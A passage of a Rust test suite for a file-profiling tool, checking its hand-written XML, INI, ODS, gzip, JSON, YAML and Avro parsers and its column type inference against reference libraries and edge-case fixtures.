                let value = if values.len() == 1 {
                    values.pop().unwrap()
                } else {
                    JsonValue::Array(values)
                };
                obj.insert(name, value);
            }
            let text = text.trim();
            if !text.is_empty() {
                if obj.is_empty() {
                    return JsonValue::String(text.to_string());
                }
                obj.insert("#text".to_string(), JsonValue::String(text.to_string()));
            }
            if obj.is_empty() {
                JsonValue::Null
            } else {
                JsonValue::Object(obj)
            }
        }

        let content = std::fs::read_to_string(path).unwrap();
        let root = xmltree::Element::parse(content.as_bytes()).unwrap();
        let child_elements: Vec<&xmltree::Element> = root
            .children
            .iter()
            .filter_map(|n| match n {
                XMLNode::Element(el) => Some(el),
                _ => None,
            })
            .collect();
        let homogeneous = child_elements.len() > 1
            && child_elements
                .iter()
                .all(|e| e.name == child_elements[0].name);

        let mut records: Vec<serde_json::Map<String, JsonValue>> = Vec::new();
        if homogeneous {
            for el in child_elements {
                match to_json(el) {
                    JsonValue::Object(m) => records.push(m),
                    other => {
                        let mut m = serde_json::Map::new();
                        m.insert("#text".to_string(), other);
                        records.push(m);
                    }
                }
            }
        } else {
            match to_json(&root) {
                JsonValue::Object(m) => records.push(m),
                _ => panic!("xmltree root has neither attributes nor children"),
            }
        }
        profile_json_records(&records, n_samples)
    }

    /// Cross-verifies the hand-rolled XML parser against `xmltree`
    /// itself on this project's own existing fixtures plus a dedicated
    /// namespace-stress fixture (see `xml_support`'s own doc comment
    /// for why namespace-prefix *stripping*, not full URI resolution,
    /// is the deliberately-scoped target here) - a synthetic file
    /// mixing a plain `<link>` with a namespaced `<atom:link>` and a
    /// namespaced `xsi:type` attribute, modeled directly on a real
    /// finding from this project's own real-world XML validation (a BBC
    /// RSS feed mixing a plain `<link>` with an Atom-namespaced one
    /// under the same flattened column - see CLAUDE.md's Dependency
    /// footprint section).
    #[cfg(feature = "xml")]
    #[test]
    fn xml_reader_matches_xmltree_output_exactly() {
        for f in [
            "tests/fixtures/sample.xml",
            "tests/fixtures/edge_unicode.xml",
            "tests/fixtures/edge_xml_namespaces.xml",
        ] {
            let path = Path::new(f);
            let mine = xml_support::columns_from_xml(path, None, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled parser failed: {e:?}"));
            let theirs = columns_from_xml_via_xmltree(path, 100);

            assert_eq!(
                mine.iter().map(|c| &c.name).collect::<Vec<_>>(),
                theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, t) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    m.current_type, t.current_type,
                    "{f} col '{}': current_type",
                    m.name
                );
                assert_eq!(
                    m.ideal_type, t.ideal_type,
                    "{f} col '{}': ideal_type",
                    m.name
                );
                assert_eq!(
                    m.sample_values, t.sample_values,
                    "{f} col '{}': sample_values",
                    m.name
                );
            }
        }
    }

    #[cfg(feature = "ini")]
    #[test]
    fn ini_reader_matches_rust_ini_output_exactly() {
        for f in [
            "tests/fixtures/sample.ini",
            "tests/fixtures/type_detection.ini",
            "tests/fixtures/edge_ini_quoting_and_escapes.ini",
        ] {
            let text = std::fs::read_to_string(f)
                .unwrap_or_else(|e| panic!("{f}: failed to read fixture: {e}"));
            let mine_raw = ini_support::parse_ini(&text)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled parser failed: {e:?}"));
            let theirs_ini = ini::Ini::load_from_str(&text)
                .unwrap_or_else(|e| panic!("{f}: rust-ini failed: {e:?}"));

            let mine: ini_support::IniSections = mine_raw
                .into_iter()
                .filter(|(_, props)| !props.is_empty())
                .collect();
            let theirs: ini_support::IniSections = theirs_ini
                .iter()
                .filter(|(_, props)| !props.is_empty())
                .map(|(name, props)| {
                    (
                        name.map(|s| s.to_string()),
                        props
                            .iter()
                            .map(|(k, v)| (k.to_string(), v.to_string()))
                            .collect(),
                    )
                })
                .collect();
            assert_eq!(mine, theirs, "{f}: hand-rolled parser vs rust-ini mismatch");
        }
    }

    #[cfg(feature = "xlsx")]
    #[test]
    fn ods_reader_matches_calamine_output_exactly() {
        for f in ["tests/fixtures/sample.ods"] {
            let path = Path::new(f);
            let expected = columns_from_xlsx_calamine(path, None, 3)
                .unwrap_or_else(|e| panic!("{f} calamine: {e:?}"));
            let got = xlsx_support::columns_from_ods(path, None, 3)
                .unwrap_or_else(|e| panic!("{f} ods: {e:?}"));
            assert_eq!(got.len(), expected.len(), "{f}: sheet count");
            for ((got_name, got_cols), (exp_name, exp_cols)) in got.iter().zip(expected.iter()) {
                assert_eq!(got_name, exp_name, "{f}: sheet name");
                assert_eq!(
                    got_cols.len(),
                    exp_cols.len(),
                    "{f} sheet '{exp_name}': column count"
                );
                for (gc, ec) in got_cols.iter().zip(exp_cols.iter()) {
                    assert_eq!(gc.name, ec.name, "{f} sheet '{exp_name}': column name");
                    assert_eq!(
                        gc.current_type, ec.current_type,
                        "{f} sheet '{exp_name}' col '{}': current_type",
                        ec.name
                    );
                    assert_eq!(
                        gc.ideal_type, ec.ideal_type,
                        "{f} sheet '{exp_name}' col '{}': ideal_type",
                        ec.name
                    );
                    assert_eq!(
                        gc.sample_values, ec.sample_values,
                        "{f} sheet '{exp_name}' col '{}': sample_values",
                        ec.name
                    );
                }
            }
        }
    }

    // A real-scale pathological case: a trailing empty-row block using
    // ODF's own row/column repeat compression at the format's actual
    // maximum dimensions (1,048,573 repeated rows x 16,384 repeated
    // columns - over 17 billion logical empty cells), the same shape a
    // real LibreOffice-authored file routinely produces when padding a
    // sheet out to its full size. Also covers a repeated *empty* cell
    // sitting in the *middle* of a row with real data on both sides
    // (verifying the gap doesn't misalign the columns after it).
    // Finishing quickly at all is itself the correctness proof for the
    // deferred/sparse handling - a naive eager expansion would either
    // hang or exhaust memory well before this test's own timeout would
    // even matter.
    #[cfg(feature = "xlsx")]
    #[test]
    fn ods_reader_handles_a_real_scale_trailing_empty_row_block_without_blowing_up() {
        let path = Path::new("tests/fixtures/edge_ods_repeated_cells.ods");
        let table = xlsx_support::columns_from_ods(path, None, 3).unwrap();
        assert_eq!(table.len(), 1);
        let (name, cols) = &table[0];
        assert_eq!(name, "Sheet1");
        let id_col = cols.iter().find(|c| c.name == "id").unwrap();
        assert_eq!(id_col.sample_values, vec!["1", "2"]);
        assert_eq!(id_col.missing_pct, 0.0);
        let note_col = cols.iter().find(|c| c.name == "note").unwrap();
        assert_eq!(note_col.sample_values, vec!["first", "second"]);
        // The repeated empty cell between id and note lands on "name",
        // correctly missing for row 1 and correctly NOT misaligning "bob"
        // in row 2 onto the wrong column.
        let name_col = cols.iter().find(|c| c.name == "name").unwrap();
        assert_eq!(name_col.missing_pct, 50.0);
        assert_eq!(name_col.sample_values, vec!["bob"]);
    }

    #[cfg(feature = "xlsx")]
    #[test]
    fn cfb_reader_extracts_the_real_workbook_stream() {
        let cfb =
            xlsx_support::CfbFile::open(Path::new("tests/fixtures/type_detection_lo.xls")).unwrap();
        let workbook = cfb.read_stream("Workbook").unwrap();
        assert_eq!(workbook.len(), 2268);
        // The exact first 20 bytes, independently extracted in Python
        // from this same file (header/FAT/directory/mini-FAT/mini-stream
        // all walked manually, cross-checked twice after an initial
        // manual hex-transcription error in this test itself - not the
        // reader - was caught and fixed) before this reader was trusted -
        // starts with a BOF record (type 0x0809, len 16), the mandatory
        // first record of any valid BIFF8 stream.
        assert_eq!(
            &workbook[0..20],
            &[
                0x09, 0x08, 0x10, 0x00, 0x00, 0x06, 0x05, 0x00, 0xbb, 0x0d, 0xcc, 0x07, 0x00, 0x00,
                0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
            ]
        );
    }

    // A real, sizable (3,000-row) gzip file, generated with the system
    // `gzip` command specifically because that forces zlib's own encoder
    // to reach for dynamic Huffman blocks (BTYPE 10) across multiple
    // blocks and long length/distance matches, not just the trivial
    // single-block case a smaller fixture would produce - see this
    // format's own real-world-corpus-validation write-up in CLAUDE.md for
    // the fuller verification this received (byte-exact diffed against
    // Python's independent zlib/gzip modules across several more real
    // files, including a 28MB/300,000-row one, before this was trusted).
    #[test]
    fn gzip_decompress_handles_a_real_multi_block_dynamic_huffman_file() {
        let bytes = include_bytes!("../tests/fixtures/edge_gzip_dynamic_huffman.csv.gz");
        let decompressed = gzip_decompress(&bytes[..]).unwrap();
        let text = String::from_utf8(decompressed).unwrap();
        let lines: Vec<&str> = text.lines().collect();
        assert_eq!(lines.len(), 3001); // header + 3,000 data rows
        assert_eq!(lines[0], "id,name,email,amount,active");
        assert_eq!(lines[1], "0,alice_0,alice0@example.com,0.00,True");
        assert_eq!(
            lines[3000],
            "2999,erin_2999,erin2999@example.com,5248.25,False"
        );
    }

    // FHCRC, FEXTRA, FNAME, and FCOMMENT all set at once - hand-built with
    // Python's zlib/struct (see the fixture's own generation script in
    // this project's history) rather than relying on the system `gzip`
    // command, which never sets FEXTRA/FCOMMENT/FHCRC in practice. Proves
    // every flag-gated skip branch in gzip_decompress, not just FNAME
    // (which the dynamic-Huffman fixture above already exercises, since
    // `gzip -k` always embeds the original filename by default).
    #[test]
    fn gzip_decompress_skips_every_optional_header_field() {
        let bytes = include_bytes!("../tests/fixtures/edge_gzip_all_optional_header_fields.csv.gz");
        let decompressed = gzip_decompress(&bytes[..]).unwrap();
        assert_eq!(
            decompressed,
            b"id,name,amount\n1,alice,10.50\n2,bob,20.25\n3,carol,30.75\n"
        );
    }

    // A single byte flipped inside sample.csv.gz's CRC32 footer field -
    // real, structurally-valid gzip that decodes cleanly at the DEFLATE
    // level, so only the checksum verification catches the corruption.
    #[test]
    fn gzip_decompress_rejects_a_corrupted_checksum() {
        let bytes = include_bytes!("../tests/fixtures/malformed_gzip_checksum.csv.gz");
        let err = gzip_decompress(&bytes[..]).unwrap_err();
        assert!(
            format!("{err:?}").contains("CRC32"),
            "expected a CRC32 mismatch error, got: {err:?}"
        );
    }

    #[test]
    fn leading_zero_requires_a_second_digit() {
        assert!(has_leading_zero("02134"));
        assert!(has_leading_zero("00501"));
        assert!(!has_leading_zero("123"));
        assert!(!has_leading_zero("0")); // single char, nothing after the zero
        assert!(!has_leading_zero("0x")); // second byte isn't a digit
    }

    #[test]
    fn date_format_must_match_every_value() {
        assert_eq!(
            matching_date_format(&["2024-01-15", "2024-12-31"]),
            Some("%Y-%m-%d")
        );
        // one value doesn't match any candidate format -> no format wins
        assert_eq!(matching_date_format(&["2024-01-15", "not-a-date"]), None);
    }

    #[test]
    fn describe_kinds_reports_a_single_kind_plainly() {
        let mut counts = HashMap::new();
        counts.insert(JsonKind::Str, 3);
        assert_eq!(describe_kinds(&counts), "String");
    }

    #[test]
    fn describe_kinds_reports_mixed_kinds_with_sorted_counts() {
        let mut counts = HashMap::new();
        counts.insert(JsonKind::Str, 2);
        counts.insert(JsonKind::Bool, 1);
        assert_eq!(describe_kinds(&counts), "mixed(String: 2, bool: 1)");
    }

    // profile_json_path is what every nested/array-of-objects format
    // (JSON, Avro, MessagePack, TOML, YAML, CBOR, XML, and Parquet/Arrow's
    // Struct/List/Map columns) shares for recursion - see CLAUDE.md's
    // architecture section. These prove every leaf value it reaches,
    // no matter how deeply nested, goes through the exact same precise
    // suggest_ideal_type engine a top-level scalar column would - not just
    // that flattening produces the right column names/shape (that
    // narrower claim already has its own coverage via
    // json_flattens_nested_object_and_array_of_objects and
    // nested_arrays_and_objects_are_recursively_typed_at_every_leaf in
    // tests/integration.rs).

    // --- read_json_values: what shapes of top-level JSON does the reader
    // accept, beyond "array of objects" / "JSON Lines of objects"? ---
    // Found via a real-world sweep against nst/JSONTestSuite (a JSON
    // parser conformance corpus, analogous to what the Pollock benchmark
    // is for CSV): before these two fixes, only 13 of 95 valid-JSON test
    // files were accepted - everything else (bare top-level scalars,
    // arrays of scalars, a pretty-printed single object) was rejected
    // with "expected an array of objects"/"expected one JSON object per
    // line", even though every one of them is a real, valid JSON document
    // with no ambiguity about what it contains. After both fixes: 95/95.

    fn read_values(json_text: &str) -> Vec<JsonValue> {
        let mut tmp = TempFile::new().unwrap();
        std::io::Write::write_all(&mut tmp, json_text.as_bytes()).unwrap();
        read_json_values(tmp.path()).unwrap()
    }

    #[test]
    fn read_json_values_accepts_a_pretty_printed_single_object() {
        // Previously misdetected as JSON Lines mode (content doesn't
        // start with '[') and then failed line-by-line, since "{" alone
        // isn't valid JSON on its own line.
        let values = read_values("{\n  \"a\": \"b\"\n}");
        assert_eq!(values, vec![serde_json::json!({"a": "b"})]);
    }

    #[test]
    fn read_json_values_still_splits_a_genuine_multi_record_jsonl_stream() {
        // The single-document fallback must not swallow real JSON Lines
        // data - serde_json rejects trailing content after a complete
        // value, so this correctly falls through to per-line parsing.
        let values = read_values("{\"a\":1}\n{\"a\":2}\n");
        assert_eq!(
            values,
            vec![serde_json::json!({"a": 1}), serde_json::json!({"a": 2})]
        );
    }

    #[test]
    fn read_json_values_accepts_a_top_level_array_of_scalars() {
        let values = read_values("[1, 2, 3]");
        assert_eq!(
            values,
            vec![
                serde_json::json!(1),
                serde_json::json!(2),
                serde_json::json!(3)
            ]
        );
    }

    #[test]
    fn read_json_values_on_an_empty_file_falls_through_to_zero_records() {
        // Neither the array branch (doesn't start with '[') nor the
        // single-document parse (empty string isn't valid JSON) can
        // claim this - it must still land on the existing, tested "empty
        // file -> zero records" contract rather than erroring.
        assert_eq!(read_values(""), Vec::<JsonValue>::new());
    }

    #[test]
    fn columns_from_json_top_level_scalar_array_becomes_one_value_column() {
        let mut tmp = TempFile::new().unwrap();
        std::io::Write::write_all(&mut tmp, b"[1, null, 3]").unwrap();
        let cols = columns_from_json(tmp.path(), None, 3).unwrap();
        assert_eq!(cols.len(), 1);
        assert_eq!(cols[0].name, "value");
        assert_eq!(cols[0].ideal_type, "i64");
        // total=3, non-null=2 -> 33.3% missing; proves the null wasn't
        // silently dropped from the missing-% accounting the way it would
        // be if `values` weren't filtered before reaching profile_json_path.
        assert!((cols[0].missing_pct - 33.3).abs() < 0.01);
    }

    #[test]
    fn profile_json_path_types_a_plain_array_of_scalars_precisely() {
        let uuids = serde_json::json!([
            "a4d1e6b0-1111-4a1a-9a1a-000000000001",
            "a4d1e6b0-1111-4a1a-9a1a-000000000002"
        ]);
        let profiles = profile_json_path("tags".to_string(), 1, vec![&uuids], 3);
        assert_eq!(profiles.len(), 1); // no nested object fields to recurse into
        assert_eq!(profiles[0].current_type, "Vec<String>");
        assert_eq!(profiles[0].ideal_type, "Vec<UUID>");
    }

    #[test]
    fn profile_json_path_types_every_field_of_an_array_of_objects() {
        let events = serde_json::json!([
            {"user_email": "alice@example.com", "amount": 50},
            {"user_email": "bob@example.com", "amount": 75}
        ]);
        let profiles = profile_json_path("events".to_string(), 1, vec![&events], 3);

        let email = profiles
            .iter()
            .find(|c| c.name == "events.user_email")
            .expect("events.user_email column missing");
        assert_eq!(email.ideal_type, "Email");

        let amount = profiles
            .iter()
            .find(|c| c.name == "events.amount")
            .expect("events.amount column missing");
        assert_eq!(amount.ideal_type, "i64");
    }

    #[test]
    fn profile_json_path_resolves_a_leaf_three_levels_deep() {
        // object -> object -> array of objects -> leaf
        let deep = serde_json::json!({"outer": {"inner_list": [{"score": 1}, {"score": 2}]}});
        let profiles = profile_json_path("deep".to_string(), 1, vec![&deep], 3);

        let score = profiles
            .iter()
            .find(|c| c.name == "deep.outer.inner_list.score")
            .expect("deep.outer.inner_list.score column missing");
        assert_eq!(score.ideal_type, "i64");
    }

    #[test]
    fn profile_json_path_does_not_overclaim_a_precise_type_for_a_scalar_and_object_mix() {
        // An array mixing raw scalars with objects can't honestly claim one
        // precise scalar type for the whole column - some elements are
        // structurally objects, not scalars at all. This is the same "no
        // partial credit" rule suggest_ideal_type's .all(...) checks
        // already apply everywhere else in this file (e.g. a "mostly
        // UUID" column isn't a trustworthy UUID column) - not a gap. The
        // object portion is still recursed into and typed normally.
        let mixed = serde_json::json!([1, 2, {"x": 1}]);
        let profiles = profile_json_path("mixed_list".to_string(), 1, vec![&mixed], 3);

        let root = &profiles[0];
        assert_eq!(root.ideal_type, "Vec<String>");
        assert!(root.notes.contains("mix of scalars and objects"));

        let x = profiles
            .iter()
            .find(|c| c.name == "mixed_list.x")
            .expect("mixed_list.x column missing");
        assert_eq!(x.ideal_type, "i64");
    }

    // xml_support's own recursive-descent parser carries an explicit depth
    // counter (see that module's own doc comment for why this replaced a
    // separate pre-parse scanner: xmltree has no recursion limit of its
    // own, and a genuinely deep document reliably stack-overflowed the
    // compiled binary before either guard existed, confirmed empirically
    // at 50,000 levels of nesting, not assumed). These test the parser's
    // depth guard directly, through the same public entry point
    // `columns_from_xml` uses; deeply_nested_xml_fails_cleanly_instead_of_a_stack_overflow
    // in tests/integration.rs proves the fix holds through the full binary.

    #[cfg(feature = "xml")]
    fn xml_doc_from_text(text: &str) -> Result<JsonValue> {
        let mut tmp = TempFile::new().unwrap();
        std::io::Write::write_all(&mut tmp, text.as_bytes()).unwrap();
        let cols = xml_support::columns_from_xml(tmp.path(), None, 1)?;
        // Just need to know parsing succeeded or failed - the exact
        // profiled columns aren't the point of these depth-guard tests.
        Ok(JsonValue::Array(
            cols.into_iter()
                .map(|c| JsonValue::String(c.name))
                .collect(),
        ))
    }

    #[cfg(feature = "xml")]
    #[test]
    fn xml_parser_rejects_a_document_past_the_depth_limit() {
        let deep = format!("<root>{}1{}</root>", "<a>".repeat(600), "</a>".repeat(600));
        let err = xml_doc_from_text(&deep).unwrap_err();
        assert!(
            format!("{err:?}").contains("nested XML elements"),
            "{err:?}"
        );
    }

    #[cfg(feature = "xml")]
    #[test]
    fn xml_parser_accepts_a_document_comfortably_under_the_depth_limit() {
        let shallow = format!("<root>{}1{}</root>", "<a>".repeat(50), "</a>".repeat(50));
        assert!(xml_doc_from_text(&shallow).is_ok());
    }

    #[cfg(feature = "xml")]
    #[test]
    fn xml_parser_ignores_angle_brackets_inside_comments_and_cdata_for_depth_purposes() {
        let noisy = format!(
            "<root><!-- {} --><item><![CDATA[{}]]></item></root>",
            "<a>".repeat(600),
            "<a>".repeat(600)
        );
        assert!(xml_doc_from_text(&noisy).is_ok());
    }

    #[cfg(feature = "xml")]
    #[test]
    fn xml_parser_does_not_count_self_closing_tags_as_adding_depth() {
        let wide = format!("<root>{}</root>", "<item/>".repeat(5000));
        assert!(xml_doc_from_text(&wide).is_ok());
    }

    // avro_support::bytes_to_decimal_string is what stands between Avro's
    // decimal logical type and an unusable raw dump of its two's-complement
    // bytes - found via exactly this kind of direct testing while checking
    // whether cloud-platform-produced Avro files (Kinesis/Event Hubs/
    // Pub-Sub, which lean on decimal for money/precise numeric fields)
    // actually render correctly. Every case here was hand-verified against
    // the digit-shifting logic before being relied on. Each unscaled value
    // is passed as `i64::to_be_bytes()` - an 8-byte two's-complement
    // encoding - since the function itself works on arbitrary-length
    // two's-complement byte arrays, the same shape Avro's own `bytes`/
    // `fixed`-encoded decimal values always are.

    #[cfg(feature = "avro")]
    #[test]
    fn avro_decimal_to_string_places_the_decimal_point_correctly() {
        assert_eq!(
            avro_support::bytes_to_decimal_string(&12345i64.to_be_bytes(), 2),
            "123.45"
        );
        assert_eq!(
            avro_support::bytes_to_decimal_string(&(-100i64).to_be_bytes(), 2),
            "-1.00"
        );
        assert_eq!(
            avro_support::bytes_to_decimal_string(&100i64.to_be_bytes(), 0),
            "100"
        );
    }

    #[cfg(feature = "avro")]
    #[test]
    fn avro_decimal_to_string_zero_pads_a_magnitude_smaller_than_the_scale() {
        // unscaled=5, scale=2 must become "0.05", not "0.5" or ".05" - the
        // exact off-by-one a naive "just insert a dot N digits from the
        // right" implementation would get wrong on a short digit string.
        assert_eq!(
            avro_support::bytes_to_decimal_string(&5i64.to_be_bytes(), 2),
            "0.05"
        );
        assert_eq!(
            avro_support::bytes_to_decimal_string(&(-5i64).to_be_bytes(), 2),
            "-0.05"
        );
        assert_eq!(
            avro_support::bytes_to_decimal_string(&0i64.to_be_bytes(), 2),
            "0.00"
        );
    }

    // --- YAML: what shapes of top-level document does the reader accept,
    // beyond "single mapping" / "sequence of mappings" / "multi-doc stream
    // of mappings"? --- Found via a real-world sweep against
    // yaml/yaml-test-suite (the YAML spec compliance corpus): before this
    // fix, sniff-rs rejected any document/element that wasn't itself a
    // mapping with "expected each YAML document/record to be a mapping",
    // even for a top-level sequence of scalars or a bare scalar document -
    // both real, valid YAML with no ambiguity about what they contain, the
    // exact same class of gap the JSON reader had (see the JSON tests
    // above and the design philosophy section in CLAUDE.md).

    #[cfg(feature = "yaml")]
    fn columns_from_yaml_text(yaml_text: &str) -> Vec<ColumnProfile> {
        let mut tmp = TempFile::new().unwrap();
        std::io::Write::write_all(&mut tmp, yaml_text.as_bytes()).unwrap();
        columns_from_yaml(tmp.path(), None, 3).unwrap()
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn columns_from_yaml_accepts_a_top_level_sequence_of_scalars() {
        let cols = columns_from_yaml_text("- 1\n- 2\n- 3\n");
        assert_eq!(cols.len(), 1);
        assert_eq!(cols[0].name, "value");
        assert_eq!(cols[0].ideal_type, "i64");
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn columns_from_yaml_accepts_a_bare_scalar_document() {
        let cols = columns_from_yaml_text("just a plain scalar string\n");
        assert_eq!(cols.len(), 1);
        assert_eq!(cols[0].name, "value");
        assert_eq!(cols[0].current_type, "String");
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn columns_from_yaml_still_reads_a_single_mapping_as_one_record() {
        // Must not regress the far more common shape - a single mapping
        // document still profiles as named columns, not a "value" column.
        // Column order isn't asserted here (serde_norway's Mapping doesn't
        // preserve YAML source order, a pre-existing, unrelated detail).
        let cols = columns_from_yaml_text("name: Alice\nage: 30\n");
        let mut names: Vec<&str> = cols.iter().map(|c| c.name.as_str()).collect();
        names.sort_unstable();
        assert_eq!(names, vec!["age", "name"]);
    }

    #[cfg(feature = "yaml")]
    fn yaml_doc(text: &str) -> JsonValue {
        yaml_support::parse_yaml_documents(text).unwrap().remove(0)
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_handles_nested_block_mappings_and_sequences() {
        let v = yaml_doc("a:\n  b:\n    - 1\n    - 2\n  c: 3\n");
        assert_eq!(v, serde_json::json!({"a": {"b": [1, 2], "c": 3}}));
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_handles_an_inline_nested_mapping_after_a_dash() {
        let v = yaml_doc("- name: Alice\n  age: 30\n- name: Bob\n  age: 25\n");
        assert_eq!(
            v,
            serde_json::json!([{"name": "Alice", "age": 30}, {"name": "Bob", "age": 25}])
        );
    }

    /// A real bug this parser's own real-world validation found (see
    /// CLAUDE.md's Dependency footprint section): a block sequence
    /// indented at the *same* level as its own key, not more - a real,
    /// common style (found in an actual Kubernetes deployment manifest's
    /// `containers:` field) that YAML explicitly permits as an exception
    /// to the usual "children more indented than parent" rule.
    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_handles_a_block_sequence_indented_the_same_as_its_own_key() {
        let v = yaml_doc("containers:\n- name: nginx\n  image: nginx:1.14.2\n");
        assert_eq!(
            v,
            serde_json::json!({"containers": [{"name": "nginx", "image": "nginx:1.14.2"}]})
        );
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_handles_flow_collections_including_multi_line() {
        let v = yaml_doc("a: {b: 1, c: [1, 2, 3]}\n");
        assert_eq!(v, serde_json::json!({"a": {"b": 1, "c": [1, 2, 3]}}));

        let v = yaml_doc("a: [1, 2,\n    3, 4]\n");
        assert_eq!(v, serde_json::json!({"a": [1, 2, 3, 4]}));
    }

    /// A real bug found the same way: the block scalar's own body
    /// indentation was measured against the wrong reference column (the
    /// synthetic column right after `key: `, rather than the key's own
    /// real indentation), which not only produced an empty string but
    /// also swallowed the *next* key entirely.
    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_handles_literal_and_folded_block_scalars() {
        let v = yaml_doc("a: |\n  line one\n  line two\nb: >\n  folded one\n  folded two\n");
        assert_eq!(
            v,
            serde_json::json!({"a": "line one\nline two\n", "b": "folded one folded two\n"})
        );
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_handles_double_quoted_escapes() {
        let v = yaml_doc(r#"a: "hi\nthere\t\u00e9""#);
        assert_eq!(v, serde_json::json!({"a": "hi\nthere\t\u{e9}"}));
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_strips_comments_outside_quotes() {
        let v = yaml_doc("a: 1 # comment\nb: 2\n");
        assert_eq!(v, serde_json::json!({"a": 1, "b": 2}));
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_folds_a_multi_line_plain_scalar_and_keeps_reading_later_keys() {
        let v = yaml_doc("a: this is a very long\n  plain scalar continuing\nb: 2\n");
        assert_eq!(
            v,
            serde_json::json!({"a": "this is a very long plain scalar continuing", "b": 2})
        );
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_honors_core_tags_including_on_a_quoted_scalar() {
        let v = yaml_doc("a: !!str 123\nb: !!int \"45\"\n");
        assert_eq!(v, serde_json::json!({"a": "123", "b": 45}));
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_handles_arbitrary_nesting_depth() {
        let v = yaml_doc("a:\n  b:\n    c:\n      d: 1\n      e: [1, {f: 2}]\n");
        assert_eq!(
            v,
            serde_json::json!({"a": {"b": {"c": {"d": 1, "e": [1, {"f": 2}]}}}})
        );
    }

    /// YAML 1.1's `yes`/`no`/`on`/`off` boolean words are deliberately
    /// *not* coerced (matching this crate's own predecessor,
    /// `serde_norway` - see that module's doc comment for why) - real,
    /// checked evidence this matters: a real GitHub Actions workflow
    /// file's top-level `on:` key, run through PyYAML's own default
    /// `safe_load`, resolves to the boolean `True` rather than the
    /// string `"on"` (the exact "Norway problem" this crate is named
    /// after) - confirmed directly, not assumed, while validating this
    /// parser against real files.
    /// A real bug found via real-world validation: before
    /// `strip_anchor_prefix` existed, `key: &anchor` (an anchor tag with
    /// no other inline content, meaning "the real value is a nested
    /// block on subsequent lines") was misread as the literal scalar
    /// string `"&anchor"`, and - worse - the nested block it should have
    /// introduced was silently orphaned (never consumed by anything, so
    /// it just vanished from the output, taking the *next* sibling key
    /// with it too). The anchored value itself is now read correctly;
    /// only *dereferencing* it via `*anchor` elsewhere remains
    /// unsupported (see the next test).
    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_reads_an_anchored_values_own_content_correctly() {
        let v = yaml_doc("defaults: &defaults\n  timeout: 30\nname: myapp\n");
        assert_eq!(
            v,
            serde_json::json!({"defaults": {"timeout": 30}, "name": "myapp"})
        );
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_gives_a_clear_error_on_an_alias_reference() {
        let err = yaml_support::parse_yaml_documents(
            "defaults: &defaults\n  timeout: 30\nprod:\n  <<: *defaults\n",
        )
        .unwrap_err();
        assert!(err.to_string().contains("alias"), "{err}");
    }

    #[cfg(feature = "yaml")]
    #[test]
    fn yaml_parser_does_not_coerce_on_off_yes_no_to_booleans() {
        let v = yaml_doc("a: on\nb: off\nc: yes\nd: no\n");
        assert_eq!(
            v,
            serde_json::json!({"a": "on", "b": "off", "c": "yes", "d": "no"})
        );
    }

    #[test]
    fn suggest_ideal_type_flags_leading_zeros_already_lost_by_numeric_parse() {
        let (ideal, note) = suggest_ideal_type(&["02134", "90210"], "i64");
        assert_eq!(ideal, "String");
        assert!(note.contains("already lost"));
    }

    #[test]
    fn suggest_ideal_type_leaves_a_note_when_leading_zeros_are_not_yet_lost() {
        let (ideal, note) = suggest_ideal_type(&["02134", "90210"], "String");
        assert_eq!(ideal, "String");
        assert!(!note.contains("already lost"));
    }

    #[test]
    fn suggest_ideal_type_recognizes_bool_words() {
        let (ideal, _) = suggest_ideal_type(&["yes", "no", "Y"], "String");
        assert_eq!(ideal, "bool");
    }

    #[test]
    fn suggest_ideal_type_recognizes_on_off_as_boolean() {
        // Found via a real-world sweep against php.ini-production (the
        // actual file shipped and deployed as-is on countless real PHP
        // servers): "On"/"Off" is PHP's own boolean directive convention
        // (also common in Apache and Windows .ini-style configs), but
        // wasn't in the original yes/no/true/false set at all, so real
        // directives like `engine = On` stayed an untyped enum/category
        // instead of resolving to bool.
        let (ideal, note) = suggest_ideal_type(&["On", "Off", "On"], "String");
        assert_eq!(ideal, "bool");
        assert!(note.contains("on/off"));
    }

    #[test]
    fn suggest_ideal_type_recognizes_currency_formatted_numbers() {
        let (ideal, note) = suggest_ideal_type(&["$1,250.50", "$340.00"], "String");
        assert_eq!(ideal, "f64");
        assert_eq!(note, "numeric strings");
    }

    #[test]
    fn suggest_ideal_type_detects_low_cardinality_as_a_category() {
        // Needs enough rows for the uniqueness ratio to clear the <5% bar -
        // 3 unique values repeated across 201 rows is ~1.5%, not the 3-in-6
        // majority a small example would give.
        let tiers = ["gold", "silver", "bronze"];
        let values: Vec<&str> = (0..201).map(|i| tiers[i % 3]).collect();
        let (ideal, note) = suggest_ideal_type(&values, "String");
        assert_eq!(ideal, "enum / category");
        assert!(note.contains("3 unique values"));
    }

    #[test]
    fn suggest_ideal_type_falls_back_to_string_for_high_cardinality_text() {
        let values = ["alpha", "bravo", "charlie", "delta", "echo"];
        let (ideal, note) = suggest_ideal_type(&values, "String");
        assert_eq!(ideal, "String");
        assert!(note.is_empty());
    }

    #[test]
    fn suggest_ideal_type_flags_a_constant_column_even_on_a_small_file() {
        // 8 rows, 1 unique value = 12.5% cardinality - the old ratio-only
        // check (< 5%) would have missed this entirely.
        let values = ["active"; 8];
        let (ideal, note) = suggest_ideal_type(&values, "String");
        assert_eq!(ideal, "enum / category");
        assert!(note.contains("constant"));
    }

    #[test]
    fn matching_date_format_recognizes_rfc3339_with_z_and_numeric_offset() {
        assert_eq!(
